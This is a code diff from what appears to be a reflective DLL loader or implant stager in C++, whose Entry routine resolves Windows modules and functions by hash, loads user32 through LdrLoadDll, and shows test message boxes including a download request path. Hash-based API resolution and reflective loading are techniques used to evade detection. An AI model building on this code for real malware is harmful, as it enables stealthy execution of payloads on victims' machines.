@@ -117,8 +117,7 @@ VOID ReallocateSections(
 }
 
 SEC(text, B) VOID Entry()
-{	
-	
+{
     // Get this base address.
 	// LPVOID lpBaseAddr = ReflectiveCaller();
 	ULONG_PTR uBaseAddr = 0x00;
@@ -129,30 +128,40 @@ SEC(text, B) VOID Entry()
 	// Get modules and functions
 	// -----------------------------------------------------------------------------
 	
-	HMODULE hNtdll = (HMODULE)Procs::GetModuleByHash(HASH_MODULE_NTDLL);
+	HMODULE hNtdll = (HMODULE)Modules::GetModuleByHash(HASH_MODULE_NTDLL);
 	if (!hNtdll)
 	{
 		return;
 	}
-	HMODULE hKernel32 = (HMODULE)Procs::GetModuleByHash(HASH_MODULE_KERNEL32);
+	HMODULE hKernel32 = (HMODULE)Modules::GetModuleByHash(HASH_MODULE_KERNEL32);
 	if (!hKernel32)
 	{
 		return;
 	}
-	HMODULE hUser32 = (HMODULE)Procs::GetModuleByHash(HASH_MODULE_USER32);
-	if (!hUser32)
-	{
-		return;
-	}
 
-	Procs::LPPROC_LOADLIBRARYA lpLoadLibraryA = reinterpret_cast<Procs::LPPROC_LOADLIBRARYA>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_LOADLIBRARYA));
-	Procs::LPPROC_GETPROCADDRESS lpGetProcAddress = reinterpret_cast<Procs::LPPROC_GETPROCADDRESS>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_GETPROCADDRESS));
-	Procs::LPPROC_MESSAGEBOXA lpMessageBoxA = reinterpret_cast<Procs::LPPROC_MESSAGEBOXA>(Procs::GetProcAddressByHash(hUser32, HASH_FUNC_MESSAGEBOXA));
-	Procs::LPPROC_VIRTUALALLOC lpVirtualAlloc = reinterpret_cast<Procs::LPPROC_VIRTUALALLOC>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALALLOC));
-	Procs::LPPROC_VIRTUALPROTECT lpVirtualProtect = reinterpret_cast<Procs::LPPROC_VIRTUALPROTECT>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALPROTECT));
+    // Get functions
+    Procs::LPPROC_LDRLOADDLL lpLdrLoadDll = reinterpret_cast<Procs::LPPROC_LDRLOADDLL>(Procs::GetProcAddressByHash(hNtdll, HASH_FUNC_LDRLOADDLL));
 	Procs::LPPROC_NTFLUSHINSTRUCTIONCACHE lpNtFlushInstructionCache = reinterpret_cast<Procs::LPPROC_NTFLUSHINSTRUCTIONCACHE>(Procs::GetProcAddressByHash(hNtdll, HASH_FUNC_NTFLUSHINSTRUCTIONCACHE));
+    
+    Procs::LPPROC_GETPROCADDRESS lpGetProcAddress = reinterpret_cast<Procs::LPPROC_GETPROCADDRESS>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_GETPROCADDRESS));
+    Procs::LPPROC_LOADLIBRARYA lpLoadLibraryA = reinterpret_cast<Procs::LPPROC_LOADLIBRARYA>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_LOADLIBRARYA));
+    Procs::LPPROC_LOADLIBRARYW lpLoadLibraryW = reinterpret_cast<Procs::LPPROC_LOADLIBRARYW>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_LOADLIBRARYW));
+    Procs::LPPROC_VIRTUALALLOC lpVirtualAlloc = reinterpret_cast<Procs::LPPROC_VIRTUALALLOC>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALALLOC));
+	Procs::LPPROC_VIRTUALPROTECT lpVirtualProtect = reinterpret_cast<Procs::LPPROC_VIRTUALPROTECT>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALPROTECT));
+
+    // -----------------------------------------------------------------------------
+	// Get other modules and functions
+	// -----------------------------------------------------------------------------
+
+    WCHAR wUser32[] = L"user32.dll";
+    HMODULE hUser32 = (HMODULE)Modules::LoadModule(lpLdrLoadDll, (LPWSTR)wUser32);
+
+    // Get functions
+	Procs::LPPROC_MESSAGEBOXA lpMessageBoxA = reinterpret_cast<Procs::LPPROC_MESSAGEBOXA>(Procs::GetProcAddressByHash(hUser32, HASH_FUNC_MESSAGEBOXA));
+	Procs::LPPROC_MESSAGEBOXW lpMessageBoxW = reinterpret_cast<Procs::LPPROC_MESSAGEBOXW>(Procs::GetProcAddressByHash(hUser32, HASH_FUNC_MESSAGEBOXW));
 	
-	lpMessageBoxA(NULL, "Test", "Test", MB_OK);
+	lpMessageBoxA(NULL, "This is 'dll-loader'.", "Entry", MB_OK);
+    lpMessageBoxW(NULL, (LPCWSTR)REQUEST_PATH_DOWNLOAD, L"Entry request path download", MB_OK);
 	
 	// -----------------------------------------------------------------------------
 	// Allocate virtual memory
